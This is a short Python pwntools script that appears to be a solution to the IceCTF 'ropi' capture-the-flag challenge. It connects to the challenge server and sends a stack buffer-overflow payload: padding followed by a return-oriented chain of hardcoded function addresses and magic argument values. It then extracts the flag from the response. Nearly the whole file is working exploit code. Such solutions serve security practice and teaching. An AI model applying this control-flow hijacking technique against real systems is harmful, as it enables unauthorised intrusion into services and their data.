#!/bin/python2

from pwn import *

HOST = 'ropi.vuln.icec.tf'
PORT =  6500

sym_ezy = p32(0x0804852d)
sym_ret = p32(0x08048569)
sym_ori = p32(0x080485c5)
sym_pro = p32(0x0804862c)

magic = {
    'ret': p32(0xbadbeeef),
    'ori': [p32(0xabcdefff), p32(0x78563412)],
}

r = remote(HOST, PORT)
# r = gdb.debug(['./ropi_1335922d55bc23ddc49a8c5077723113d5cddf02756ad8231e96058188bfc249'])
print r.recvuntil('messaggio?')
log.info('Sending first exploit ...')
r.send('A' * (0x28 + 4) + sym_ret + 
    sym_ori + magic['ret'] + 
    sym_pro + magic['ori'][0])
log.success('Sended')
flag = r.recvuntil('}')
flag = flag[flag.find('IceCTF'):]
log.success('Flag: ' + flag)
